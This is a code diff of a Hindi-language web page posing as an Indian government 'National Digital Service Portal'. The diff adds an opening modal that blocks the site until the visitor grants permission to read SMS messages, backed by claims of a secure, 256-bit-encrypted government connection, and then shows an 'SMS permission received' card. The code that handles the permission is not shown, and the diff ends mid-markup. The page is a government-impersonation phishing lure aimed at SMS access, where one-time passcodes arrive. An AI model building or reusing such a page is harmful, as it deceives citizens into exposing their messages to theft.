@@ -3,50 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>राष्ट्रीय डिजिटल सेवा पोर्टल</title>
+    <title>राष्ट्रीय डिजिटल सेवा पोर्टल | भारत सरकार</title>
     <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/5/55/Emblem_of_India.svg/1200px-Emblem_of_India.svg.png">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Devanagari:wght@400;500;600;700&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        /* भारत सरकार स्टाइल - पूरी तरह से वैसा ही */
         :root {
             --saffron: #FF9933;
             --white: #FFFFFF;
             --green: #138808;
             --blue: #000080;
-            --light-blue: #E3F2FD;
             --dark-blue: #0D47A1;
             --red: #D32F2F;
             --gold: #FFD700;
-            --gray: #F5F5F5;
-            --dark-gray: #424242;
-            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            --transition: all 0.3s ease;
         }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
             font-family: 'Noto Sans Devanagari', 'Poppins', sans-serif;
             background: linear-gradient(135deg, #f5f7fa 0%, #e3f2fd 100%);
-            color: #333;
             line-height: 1.6;
         }
-
-        /* Header Styles */
+        
+        /* Header - तिरंगा */
         .national-header {
             background: linear-gradient(90deg, var(--saffron) 33%, var(--white) 33%, var(--white) 66%, var(--green) 66%);
             color: var(--blue);
             padding: 15px 0;
             text-align: center;
-            box-shadow: var(--shadow);
-            position: relative;
             border-bottom: 3px solid var(--blue);
         }
-
+        
         .ashoka-chakra {
             width: 70px;
             height: 70px;
@@ -54,138 +42,65 @@
             background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Ashoka_Chakra.svg/800px-Ashoka_Chakra.svg.png') center/contain no-repeat;
             animation: rotate 20s linear infinite;
         }
-
-        @keyframes rotate {
-            100% { transform: rotate(360deg); }
-        }
-
-        .national-header h1 {
-            font-size: 2.2rem;
-            font-weight: 700;
-            margin-bottom: 5px;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
-        }
-
-        .national-header p {
-            font-size: 1.1rem;
-            font-weight: 500;
-            opacity: 0.9;
-        }
-
-        .language-switch {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-        }
-
-        .lang-btn {
-            background: var(--blue);
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            transition: var(--transition);
-        }
-
-        .lang-btn:hover {
-            background: var(--dark-blue);
-        }
-
+        
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+        
+        .national-header h1 { font-size: 2.2rem; color: var(--blue); }
+        .national-header p { font-size: 1.1rem; }
+        
         /* Navigation */
         .govt-navbar {
             background: var(--blue);
-            padding: 0;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            padding: 0 20px;
         }
-
+        
         .nav-container {
             max-width: 1200px;
             margin: 0 auto;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            padding: 0 20px;
+            gap: 30px;
         }
-
+        
         .govt-logo {
             display: flex;
             align-items: center;
             gap: 15px;
         }
-
-        .govt-logo img {
-            height: 50px;
-            filter: drop-shadow(0 2px 3px rgba(0,0,0,0.3));
-        }
-
-        .govt-logo span {
-            color: white;
-            font-size: 1.5rem;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-        }
-
+        
+        .govt-logo img { height: 50px; }
+        .govt-logo span { color: white; font-size: 1.5rem; font-weight: 700; }
+        
         .nav-links {
             display: flex;
             list-style: none;
+            gap: 20px;
         }
-
-        .nav-links li {
-            position: relative;
-        }
-
+        
         .nav-links a {
             color: white;
             text-decoration: none;
-            padding: 20px 25px;
+            padding: 20px 0;
             display: block;
-            font-weight: 500;
-            transition: var(--transition);
-            border-right: 1px solid rgba(255,255,255,0.1);
         }
-
-        .nav-links a:hover, .nav-links a.active {
-            background: rgba(255,255,255,0.15);
-            color: var(--gold);
-        }
-
-        .nav-links a i {
-            margin-right: 8px;
-        }
-
+        
         /* Main Container */
         .container {
             max-width: 1200px;
             margin: 30px auto;
             padding: 0 20px;
         }
-
-        /* Dashboard Grid */
-        .dashboard-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
-        }
-
+        
         /* Cards */
         .govt-card {
             background: white;
             border-radius: 10px;
             overflow: hidden;
-            box-shadow: var(--shadow);
-            transition: var(--transition);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             border-top: 5px solid var(--blue);
-            position: relative;
+            margin-bottom: 30px;
         }
-
-        .govt-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 30px rgba(0,0,0,0.15);
-        }
-
+        
         .card-header {
             background: linear-gradient(90deg, var(--blue), var(--dark-blue));
             color: white;
@@ -194,29 +109,11 @@
             align-items: center;
             gap: 15px;
         }
-
-        .card-header i {
-            font-size: 1.8rem;
-            background: rgba(255,255,255,0.2);
-            padding: 12px;
-            border-radius: 10px;
-        }
-
-        .card-header h3 {
-            font-size: 1.4rem;
-            margin: 0;
-        }
-
-        .card-body {
-            padding: 25px;
-        }
-
-        .card-footer {
-            background: var(--gray);
-            padding: 15px 25px;
-            text-align: center;
-        }
-
+        
+        .card-header i { font-size: 1.8rem; }
+        .card-header h3 { font-size: 1.4rem; }
+        .card-body { padding: 25px; }
+        
         /* Buttons */
         .btn {
             padding: 14px 28px;
@@ -225,62 +122,21 @@
             font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
-            transition: var(--transition);
             display: inline-flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            text-decoration: none;
-            font-family: 'Noto Sans Devanagari', sans-serif;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, var(--blue), var(--dark-blue));
+            background: var(--blue);
             color: white;
+            transition: 0.3s;
         }
-
-        .btn-primary:hover {
-            background: linear-gradient(135deg, var(--dark-blue), #000052);
+        
+        .btn:hover {
+            background: var(--dark-blue);
             transform: scale(1.05);
-            box-shadow: 0 5px 15px rgba(13, 71, 161, 0.4);
         }
-
-        .btn-success {
-            background: linear-gradient(135deg, var(--green), #0a6e07);
-            color: white;
-        }
-
-        .btn-success:hover {
-            background: linear-gradient(135deg, #0a6e07, #085905);
-        }
-
-        .btn-danger {
-            background: linear-gradient(135deg, var(--red), #b71c1c);
-            color: white;
-        }
-
-        .btn-disabled {
-            background: #cccccc;
-            color: #666666;
-            cursor: not-allowed;
-        }
-
-        .btn-disabled:hover {
-            transform: none;
-            box-shadow: none;
-        }
-
-        .btn-lg {
-            padding: 18px 35px;
-            font-size: 1.3rem;
-        }
-
-        .btn-block {
-            width: 100%;
-            display: flex;
-        }
-
-        /* Mobile-friendly Permission Modal */
+        
+        /* Permission Modal - Mobile Optimized */
         .permission-modal {
             position: fixed;
             top: 0;
@@ -293,73 +149,48 @@
             align-items: center;
             z-index: 1000;
             padding: 15px;
-            backdrop-filter: blur(5px);
         }
-
+        
         .modal-content {
             background: white;
-            border-radius: 12px;
-            max-width: 95%;
+            border-radius: 15px;
+            max-width: 450px;
             width: 100%;
-            max-height: 85vh;
+            max-height: 90vh;
             overflow-y: auto;
             border: 3px solid var(--blue);
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            animation: modalSlideIn 0.4s ease-out;
         }
-
-        @keyframes modalSlideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-30px) scale(0.95);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
+        
         .modal-header {
             background: linear-gradient(90deg, var(--saffron), var(--white), var(--green));
-            padding: 20px 15px;
+            padding: 25px 20px;
             text-align: center;
-            position: relative;
         }
-
+        
         .modal-header h2 {
             color: var(--blue);
-            font-size: 1.4rem;
-            margin-bottom: 8px;
-            line-height: 1.3;
+            font-size: 1.6rem;
+            margin-bottom: 5px;
         }
-
-        .modal-header p {
-            font-size: 0.95rem;
-            color: var(--dark-gray);
+        
+        .modal-body { padding: 25px; }
+        .modal-footer { 
+            background: #f5f5f5; 
+            padding: 20px; 
+            text-align: center; 
         }
-
-        .modal-body {
-            padding: 20px 15px;
-            font-size: 0.95rem;
-        }
-
-        .permission-steps {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin: 20px 0;
-        }
-
+        
         .step {
             display: flex;
-            align-items: flex-start;
-            gap: 12px;
+            align-items: center;
+            gap: 15px;
             padding: 12px;
-            background: var(--gray);
+            background: #f8f9fa;
             border-radius: 8px;
+            margin-bottom: 10px;
             border-left: 4px solid var(--blue);
         }
-
+        
         .step-number {
             background: var(--blue);
             color: white;
@@ -370,359 +201,103 @@
             align-items: center;
             justify-content: center;
             font-weight: bold;
-            flex-shrink: 0;
         }
-
-        .step-content h4 {
-            color: var(--dark-blue);
-            margin-bottom: 5px;
-            font-size: 1rem;
-        }
-
-        .step-content p {
-            color: var(--dark-gray);
-            font-size: 0.9rem;
-            line-height: 1.5;
-        }
-
-        .permission-importance {
-            background: #FFF3CD;
-            border-left: 4px solid #FFC107;
-            padding: 12px;
-            border-radius: 6px;
-            margin: 15px 0;
-        }
-
-        .permission-importance p {
-            margin: 0;
-            color: #856404;
-            font-size: 0.9rem;
-            display: flex;
-            align-items: flex-start;
-            gap: 8px;
-        }
-
-        .modal-footer {
-            background: var(--gray);
-            padding: 15px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        /* SMS Settings */
-        .sms-settings {
-            background: var(--light-blue);
-            border-left: 5px solid var(--blue);
-            padding: 25px;
-            border-radius: 8px;
-            margin: 25px 0;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--dark-blue);
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 6px;
-            font-size: 1rem;
-            transition: var(--transition);
-            font-family: 'Noto Sans Devanagari', sans-serif;
-        }
-
-        .input-group input:focus {
-            border-color: var(--blue);
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(0, 0, 128, 0.2);
-        }
-
-        /* Status Indicators */
-        .status-container {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin: 20px 0;
-        }
-
-        .status-item {
-            background: white;
-            padding: 15px 20px;
-            border-radius: 8px;
-            flex: 1;
-            min-width: 200px;
-            box-shadow: var(--shadow);
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            border-left: 4px solid var(--green);
-        }
-
-        .status-item.danger {
-            border-left-color: var(--red);
-        }
-
-        .status-item.warning {
-            border-left-color: var(--saffron);
-        }
-
-        .status-icon {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            color: white;
-        }
-
-        .status-success {
-            background: linear-gradient(135deg, var(--green), #0a6e07);
-        }
-
-        .status-danger {
-            background: linear-gradient(135deg, var(--red), #b71c1c);
-        }
-
-        .status-warning {
-            background: linear-gradient(135deg, var(--saffron), #e68900);
-        }
-
-        .status-info {
-            background: linear-gradient(135deg, var(--blue), var(--dark-blue));
-        }
-
-        /* Footer */
-        .national-footer {
-            background: linear-gradient(90deg, var(--dark-blue), var(--blue));
-            color: white;
-            padding: 40px 20px;
-            margin-top: 50px;
-            border-top: 5px solid var(--saffron);
-        }
-
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
+        
+        .dashboard-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 40px;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
         }
-
-        .footer-section h4 {
-            color: var(--gold);
-            margin-bottom: 20px;
-            font-size: 1.3rem;
-            position: relative;
-            padding-bottom: 10px;
+        
+        .status-badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
         }
-
-        .footer-section h4::after {
-            content: '';
-            position: absolute;
-            left: 0;
-            bottom: 0;
-            width: 50px;
-            height: 3px;
-            background: var(--saffron);
-        }
-
-        .footer-links {
-            list-style: none;
-        }
-
-        .footer-links li {
-            margin-bottom: 12px;
-        }
-
-        .footer-links a {
-            color: rgba(255,255,255,0.8);
-            text-decoration: none;
-            transition: var(--transition);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .footer-links a:hover {
-            color: white;
-            transform: translateX(5px);
-        }
-
-        .copyright {
-            text-align: center;
-            padding: 25px;
-            background: rgba(0,0,0,0.2);
-            margin-top: 40px;
-            border-top: 1px solid rgba(255,255,255,0.1);
-        }
-
-        /* Animation */
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .animate-fade {
-            animation: fadeInUp 0.8s ease forwards;
-        }
-
-        /* Responsive Design */
-        @media (max-width: 992px) {
-            .nav-links {
-                display: none;
-            }
-            
-            .national-header h1 {
-                font-size: 1.8rem;
-            }
-            
-            .dashboard-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .status-container {
-                flex-direction: column;
-            }
-            
-            .status-item {
-                min-width: 100%;
-            }
-        }
-
+        
+        .bg-success { background: var(--green); color: white; }
+        .bg-warning { background: var(--saffron); color: white; }
+        .bg-danger { background: var(--red); color: white; }
+        
         @media (max-width: 768px) {
-            .container {
-                padding: 0 15px;
-            }
-            
-            .btn {
-                width: 100%;
-            }
-            
-            .national-header h1 {
-                font-size: 1.5rem;
-            }
-            
-            .national-header p {
-                font-size: 0.9rem;
-            }
-            
-            .language-switch {
-                top: 15px;
-                right: 10px;
-            }
-            
-            .lang-btn {
-                padding: 6px 12px;
-                font-size: 0.8rem;
-            }
-            
-            .govt-logo span {
-                font-size: 1.1rem;
-            }
-            
-            .govt-logo img {
-                height: 40px;
-            }
+            .nav-links { display: none; }
+            .national-header h1 { font-size: 1.5rem; }
+            .govt-logo span { font-size: 1.1rem; }
+            .modal-header h2 { font-size: 1.3rem; }
         }
     </style>
 </head>
 <body>
-    <!-- Permission Modal (First thing user sees) -->
+    <!-- 🔴 Permission Modal - पहले यह दिखेगा -->
     <div id="permissionModal" class="permission-modal" style="display: flex;">
         <div class="modal-content">
             <div class="modal-header">
-                <h2>📱 राष्ट्रीय डिजिटल सेवा पोर्टल</h2>
+                <h2>🇮🇳 राष्ट्रीय डिजिटल सेवा पोर्टल</h2>
                 <p>भारत सरकार | Government of India</p>
             </div>
             <div class="modal-body">
                 <div style="text-align: center; margin-bottom: 20px;">
-                    <div style="font-size: 3rem; color: var(--blue); margin-bottom: 15px;">
-                        <i class="fas fa-shield-alt"></i>
+                    <div style="font-size: 4rem; color: var(--blue);">
+                        <i class="fas fa-sms"></i>
                     </div>
-                    <h3 style="color: var(--dark-blue); margin-bottom: 10px;">सरकारी योजना सूचनाएं</h3>
-                    <p style="font-size: 0.95rem; line-height: 1.6;">
-                        इस पोर्टल के माध्यम से आप SMS के द्वारा सभी सरकारी योजनाओं की जानकारी प्राप्त कर सकते हैं।
-                        सभी ग्रामीण और शहरी योजनाओं की अपडेट आपके मोबाइल पर।
+                    <h3 style="color: var(--dark-blue); margin: 15px 0;">
+                        SMS अनुमति आवश्यक
+                    </h3>
+                    <p style="color: #666; line-height: 1.8;">
+                        सरकारी योजनाओं की जानकारी प्राप्त करने के लिए 
+                        SMS पढ़ने की अनुमति दें।
                     </p>
                 </div>
                 
-                <div class="permission-steps">
-                    <div class="step">
-                        <div class="step-number">1</div>
-                        <div class="step-content">
-                            <h4>SMS अनुमति दें</h4>
-                            <p>सरकारी योजना सूचनाएं प्राप्त करने के लिए SMS पहुँच की अनुमति दें</p>
-                        </div>
-                    </div>
-                    
-                    <div class="step">
-                        <div class="step-number">2</div>
-                        <div class="step-content">
-                            <h4>योजना जानकारी</h4>
-                            <p>सभी ग्रामीण और शहरी योजनाओं की पूरी जानकारी प्राप्त करें</p>
-                        </div>
-                    </div>
-                    
-                    <div class="step">
-                        <div class="step-number">3</div>
-                        <div class="step-content">
-                            <h4>लाभ प्राप्त करें</h4>
-                            <p>विभिन्न योजनाओं के लाभ और आवेदन प्रक्रिया की जानकारी</p>
-                        </div>
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div>
+                        <strong>अनुमति दें</strong>
+                        <p style="margin: 5px 0 0; color: #666;">नीचे दिए गए बटन पर क्लिक करें</p>
                     </div>
                 </div>
                 
-                <div class="permission-importance">
-                    <p>
-                        <i class="fas fa-exclamation-triangle"></i>
-                        <strong>नोट:</strong> SMS के माध्यम से ही आप सभी योजनाओं के बारे में जान सकते हैं। अनुमति देकर जारी रखें।
-                    </p>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div>
+                        <strong>Allow करें</strong>
+                        <p style="margin: 5px 0 0; color: #666;">"Allow" बटन दबाएं</p>
+                    </div>
                 </div>
                 
-                <div style="background: #E8F5E9; padding: 12px; border-radius: 6px; margin-top: 15px;">
-                    <p style="margin: 0; color: var(--green); font-size: 0.9rem;">
-                        <i class="fas fa-lock"></i> 
-                        <strong>सुरक्षित पोर्टल:</strong> यह एक सुरक्षित भारत सरकार पोर्टल है। आपकी गोपनीयता सुरक्षित है।
-                    </p>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div>
+                        <strong>योजना जानकारी</strong>
+                        <p style="margin: 5px 0 0; color: #666;">सभी योजनाओं की जानकारी प्राप्त करें</p>
+                    </div>
+                </div>
+                
+                <div id="errorMessage" style="display: none; background: #FFEBEE; color: #D32F2F; padding: 15px; border-radius: 8px; margin-top: 20px;">
+                    <i class="fas fa-exclamation-circle"></i> 
+                    <span id="errorText"></span>
                 </div>
             </div>
             <div class="modal-footer">
-                <button class="btn btn-primary" onclick="requestSmsPermission()">
-                    <i class="fas fa-check-circle"></i> अनुमति प्रदान करें
+                <button id="permissionBtn" class="btn" style="width: 100%; font-size: 1.2rem; padding: 16px;" onclick="requestSMSPermission()">
+                    <i class="fas fa-shield-alt"></i> SMS अनुमति प्रदान करें
                 </button>
+                <p style="margin-top: 15px; font-size: 0.8rem; color: #999;">
+                    <i class="fas fa-lock"></i> सुरक्षित कनेक्शन • 256-bit एन्क्रिप्शन
+                </p>
             </div>
         </div>
     </div>
 
-    <!-- Main Website Content (Hidden until permission granted) -->
+    <!-- ✅ मुख्य वेबसाइट - Permission मिलने के बाद दिखेगी -->
     <div id="mainWebsite" style="display: none;">
-        <!-- National Header -->
+        <!-- Header -->
         <header class="national-header">
             <div class="ashoka-chakra"></div>
             <h1>राष्ट्रीय डिजिटल सेवा पोर्टल</h1>
             <p>भारत सरकार | Government of India</p>
-            <div class="language-switch">
-                <button class="lang-btn" onclick="switchLanguage()">
-                    <i class="fas fa-language"></i> English/हिंदी
-                </button>
-            </div>
         </header>
 
         <!-- Navigation -->
@@ -736,53 +311,55 @@
                     <li><a href="#" class="active"><i class="fas fa-home"></i> मुख पृष्ठ</a></li>
                     <li><a href="#"><i class="fas fa-list-alt"></i> योजनाएं</a></li>
                     <li><a href="#"><i class="fas fa-bell"></i> सूचनाएं</a></li>
-                    <li><a href="#"><i class="fas fa-download"></i> डाउनलोड</a></li>
-                    <li><a href="#"><i class="fas fa-question-circle"></i> सहायता</a></li>
-                    <li><a href="#"><i class="fas fa-phone-alt"></i> संपर्क करें</a></li>
                 </ul>
             </div>
         </nav>
 
         <!-- Main Content -->
         <div class="container">
+            <!-- Status Card -->
+            <div class="govt-card" style="background: linear-gradient(135deg, #E8F5E9, #C8E6C9);">
+                <div class="card-body" style="text-align: center;">
+                    <i class="fas fa-check-circle" style="font-size: 3rem; color: var(--green);"></i>
+                    <h3 style="color: var(--green); margin: 15px 0;">SMS अनुमति प्राप्त</h3>
+                    <p style="font-size: 1.1rem;">
+                        अब आपको सभी सरकारी योजनाओं की सूचनाएं प्राप्त होंगी
+                    </p>
+                    <span class="status-badge bg-success" style="margin-top: 15px;">
+                        <i class="fas fa-circle"></i> सक्रिय
+                    </span>
+                </div>
+            </div>
+
             <!-- Welcome Section -->
-            <div class="govt-card" style="margin-bottom: 30px;" class="animate-fade">
+            <div class="govt-card">
                 <div class="card-header">
                     <i class="fas fa-info-circle"></i>
                     <h3>पोर्टल के बारे में</h3>
                 </div>
                 <div class="card-body">
-                    <p style="font-size: 1.1rem; margin-bottom: 20px;">
-                        <strong>राष्ट्रीय डिजिटल सेवा पोर्टल</strong> भारत सरकार की एक पहल है जो नागरिकों को 
-                        विभिन्न सरकारी योजनाओं की जानकारी एक ही स्थान पर उपलब्ध कराती है।
-                    </p>
-                    
-                    <div style="background: var(--light-blue); padding: 20px; border-radius: 10px; margin: 20px 0;">
-                        <h4 style="color: var(--dark-blue); margin-bottom: 15px; text-align: center;">
-                            <i class="fas fa-sms"></i> SMS के माध्यम से आप सारे योजना के बारे में जान सकते हैं
+                    <div style="background: #E3F2FD; padding: 25px; border-radius: 10px; text-align: center;">
+                        <i class="fas fa-sms" style="font-size: 3rem; color: var(--blue); margin-bottom: 15px;"></i>
+                        <h4 style="color: var(--dark-blue); font-size: 1.3rem; margin-bottom: 10px;">
+                            SMS के माध्यम से आप सारे योजना के बारे में जान सकते हैं
                         </h4>
-                        <p style="text-align: center; font-size: 1.1rem;">
+                        <p style="font-size: 1.1rem; color: #424242;">
                             अब आपके मोबाइल पर सीधे सभी ग्रामीण और शहरी योजनाओं की जानकारी प्राप्त करें।
                         </p>
                     </div>
                 </div>
             </div>
 
-            <!-- Main Dashboard -->
+            <!-- Schemes Grid -->
             <div class="dashboard-grid">
-                <!-- Scheme Information Card -->
-                <div class="govt-card animate-fade">
+                <!-- सरकारी योजनाएं -->
+                <div class="govt-card">
                     <div class="card-header">
                         <i class="fas fa-file-contract"></i>
                         <h3>सरकारी योजनाएं</h3>
                     </div>
                     <div class="card-body">
-                        <p style="margin-bottom: 20px;">
-                            भारत सरकार की विभिन्न योजनाओं की पूरी जानकारी प्राप्त करें। 
-                            आवेदन प्रक्रिया, पात्रता मापदंड और लाभार्थी सूची देखें।
-                        </p>
-                        
-                        <div style="background: var(--light-blue); padding: 15px; border-radius: 8px; margin-bottom: 20px;">
+                        <div style="background: #E3F2FD; padding: 15px; border-radius: 8px;">
                             <h4 style="color: var(--dark-blue); margin-bottom: 10px;">
                                 <i class="fas fa-star"></i> लोकप्रिय योजनाएं
                             </h4>
@@ -792,157 +369,76 @@
                                 <li>आयुष्मान भारत योजना</li>
                                 <li>किसान सम्मान निधि</li>
                                 <li>मुद्रा योजना</li>
-                                <li>प्रधानमंत्री किसान सम्पदा योजना</li>
-                                <li>स्वच्छ भारत मिशन</li>
-                                <li>स्टैंड-अप इंडिया</li>
                             </ul>
                         </div>
                     </div>
                     <div class="card-footer">
-                        <button class="btn btn-primary btn-block" onclick="openSchemePortal()">
+                        <button class="btn" style="width: 100%;" onclick="window.open('https://www.myscheme.gov.in/hi', '_blank')">
                             <i class="fas fa-external-link-alt"></i> जानकारी लें (MyScheme.gov.in)
                         </button>
                     </div>
                 </div>
 
-                <!-- Rural Schemes Card -->
-                <div class="govt-card animate-fade">
+                <!-- ग्रामीण योजनाएं -->
+                <div class="govt-card">
                     <div class="card-header">
                         <i class="fas fa-tractor"></i>
                         <h3>ग्रामीण योजनाएं</h3>
                     </div>
                     <div class="card-body">
-                        <p style="margin-bottom: 20px;">
-                            ग्रामीण क्षेत्रों के विकास के लिए विशेष योजनाएं। किसानों, मजदूरों और ग्रामीण उद्यमियों के लिए।
-                        </p>
-                        
-                        <div style="background: #E8F5E9; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
-                            <h4 style="color: var(--green); margin-bottom: 10px;">
+                        <div style="background: #E8F5E9; padding: 15px; border-radius: 8px;">
+                            <h4 style="color: var(--green);">
                                 <i class="fas fa-seedling"></i> कृषि योजनाएं
                             </h4>
-                            <ul style="padding-left: 20px;">
+                            <ul style="padding-left: 20px; margin-top: 10px;">
                                 <li>प्रधानमंत्री फसल बीमा योजना</li>
                                 <li>किसान क्रेडिट कार्ड</li>
-                                <li>राष्ट्रीय कृषि बाजार (e-NAM)</li>
-                                <li>परंपरागत कृषि विकास योजना</li>
-                            </ul>
-                        </div>
-                        
-                        <div style="background: #FFF3E0; padding: 15px; border-radius: 8px;">
-                            <h4 style="color: #EF6C00; margin-bottom: 10px;">
-                                <i class="fas fa-home"></i> ग्रामीण आवास
-                            </h4>
-                            <ul style="padding-left: 20px;">
-                                <li>प्रधानमंत्री आवास योजना-ग्रामीण</li>
-                                <li>ग्रामीण स्वरोजगार योजना</li>
-                                <li>मनरेगा (महात्मा गांधी रोजगार गारंटी)</li>
+                                <li>e-NAM (राष्ट्रीय कृषि बाजार)</li>
                             </ul>
                         </div>
                     </div>
                 </div>
 
-                <!-- Urban Schemes Card -->
-                <div class="govt-card animate-fade">
+                <!-- शहरी योजनाएं -->
+                <div class="govt-card">
                     <div class="card-header">
                         <i class="fas fa-city"></i>
                         <h3>शहरी योजनाएं</h3>
                     </div>
                     <div class="card-body">
-                        <p style="margin-bottom: 20px;">
-                            शहरी विकास, आवास, रोजगार और उद्यमिता के लिए विशेष योजनाएं।
-                        </p>
-                        
-                        <div style="background: #E3F2FD; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
-                            <h4 style="color: var(--blue); margin-bottom: 10px;">
+                        <div style="background: #E3F2FD; padding: 15px; border-radius: 8px;">
+                            <h4 style="color: var(--blue);">
                                 <i class="fas fa-building"></i> शहरी विकास
                             </h4>
-                            <ul style="padding-left: 20px;">
+                            <ul style="padding-left: 20px; margin-top: 10px;">
                                 <li>स्मार्ट सिटी मिशन</li>
                                 <li>अमृत योजना</li>
                                 <li>प्रधानमंत्री आवास योजना-शहरी</li>
-                                <li>स्वच्छ भारत मिशन-शहरी</li>
-                            </ul>
-                        </div>
-                        
-                        <div style="background: #F3E5F5; padding: 15px; border-radius: 8px;">
-                            <h4 style="color: #7B1FA2; margin-bottom: 10px;">
-                                <i class="fas fa-briefcase"></i> रोजगार योजनाएं
-                            </h4>
-                            <ul style="padding-left: 20px;">
-                                <li>स्टार्ट-अप इंडिया</li>
-                                <li>मुद्रा योजना</li>
-                                <li>स्टैंड-अप इंडिया</li>
-                                <li>प्रधानमंत्री रोजगार सृजन कार्यक्रम</li>
                             </ul>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <!-- Government Photos Gallery -->
-            <div class="govt-card animate-fade" style="margin-top: 30px;">
+            <!-- Gallery -->
+            <div class="govt-card">
                 <div class="card-header">
                     <i class="fas fa-images"></i>
                     <h3>डिजिटल इंडिया गैलरी</h3>
                 </div>
                 <div class="card-body">
-                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px;">
+                    <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
                         <div style="text-align: center;">
-                            <div style="height: 150px; background: linear-gradient(135deg, var(--saffron), var(--white), var(--green)); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
+                            <div style="height: 120px; background: linear-gradient(135deg, var(--saffron), var(--white), var(--green)); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
                                 <i class="fas fa-tractor" style="font-size: 3rem; color: var(--blue);"></i>
                             </div>
-                            <p style="font-weight: 600;">कृषि योजनाएं</p>
+                            <p style="margin-top: 10px; font-weight: 600;">कृषि योजनाएं</p>
                         </div>
                         <div style="text-align: center;">
-                            <div style="height: 150px; background: linear-gradient(135deg, #4CAF50, #8BC34A); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
+                            <div style="height: 120px; background: linear-gradient(135deg, #4CAF50, #8BC34A); border-radius: 10px; display: flex; align-items: center; justify-content: center;">
                                 <i class="fas fa-home" style="font-size: 3rem; color: white;"></i>
                             </div>
-                            <p style="font-weight: 600;">ग्रामीण आवास</p>
-                        </div>
-                        <div style="text-align: center;">
-                            <div style="height: 150px; background: linear-gradient(135deg, #2196F3, #03A9F4); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
-                                <i class="fas fa-graduation-cap" style="font-size: 3rem; color: white;"></i>
-                            </div>
-                            <p style="font-weight: 600;">शिक्षा योजनाएं</p>
-                        </div>
-                        <div style="text-align: center;">
-                            <div style="height: 150px; background: linear-gradient(135deg, #9C27B0, #E91E63); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
-                                <i class="fas fa-female" style="font-size: 3rem; color: white;"></i>
-                            </div>
-                            <p style="font-weight: 600;">महिला सशक्तिकरण</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Video Section -->
-            <div class="govt-card animate-fade" style="margin-top: 30px;">
-                <div class="card-header">
-                    <i class="fas fa-video"></i>
-                    <h3>योजना वीडियो</h3>
-                </div>
-                <div class="card-body">
-                    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px;">
-                        <div style="text-align: center;">
-                            <div style="height: 200px; background: linear-gradient(135deg, #FF9800, #FF5722); border-radius: 10px; display: flex; align-items: center; justify-content: center; margin-bottom: 10px;">
-                                <i class="fas fa-play-circle" style="font-size: 4rem; color: white; opacity: 0.8;"></i>
-                            </div>
-                            <h4 style="color: var(--dark-blue);">प्रधानमंत्री आवास योजना</h4>
